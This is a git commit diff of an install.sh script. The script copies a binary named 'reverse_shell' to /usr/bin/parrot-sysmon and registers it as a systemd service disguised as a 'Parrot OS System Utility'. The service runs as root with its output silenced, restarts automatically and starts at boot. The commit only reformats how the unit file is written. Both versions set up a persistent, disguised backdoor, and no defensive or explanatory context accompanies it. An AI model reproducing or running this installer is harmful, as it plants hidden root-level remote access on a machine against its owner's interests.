f804af048286578ca6d8d37c60126761ee638d68
arif_hossen <arifhavenresort@gmail.com>
2025-09-28 11:20:28 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,21 @@
 #!/bin/bash
 sudo cp reverse_shell /usr/bin/parrot-sysmon
 sudo chmod +x /usr/bin/parrot-sysmon
-sudo bash -c 'echo "[Unit]\nDescription=Parrot OS System Utility\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/parrot-sysmon\nRestart=always\nStandardOutput=null\nStandardError=null\nUser=root\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/parrot-sysmon.service'
+sudo bash -c 'cat > /etc/systemd/system/parrot-sysmon.service << EOF
+[Unit]
+Description=Parrot OS System Utility
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/parrot-sysmon
+Restart=always
+StandardOutput=null
+StandardError=null
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF'
 sudo systemctl daemon-reload
 sudo systemctl enable parrot-sysmon.service
 sudo systemctl start parrot-sysmon.service > /dev/null 2>&1
